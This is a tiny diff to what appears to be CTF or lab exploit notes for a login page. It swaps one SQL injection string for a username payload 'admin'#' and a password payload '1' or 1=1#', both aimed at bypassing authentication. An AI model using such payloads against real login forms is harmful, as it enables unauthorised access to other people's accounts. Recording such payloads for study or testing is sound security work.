@@ -2,4 +2,5 @@
 
 ## Exploit
 - Login
-  - ```1' and 1=1#``` 
+  - username: ```admin'#``` 
+  - password: ```1' or 1=1#``` 
